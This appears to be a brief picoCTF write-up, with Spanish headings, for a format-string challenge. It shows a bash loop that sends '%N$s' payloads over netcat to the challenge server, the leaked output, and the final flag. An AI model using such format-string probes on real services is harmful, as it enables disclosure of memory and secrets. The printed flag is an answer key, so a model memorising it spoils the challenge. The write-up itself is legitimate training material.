## Objetivo

Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 60599`
## Hints


## Solución

```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 60599; done
Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}
```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_64bf08ef}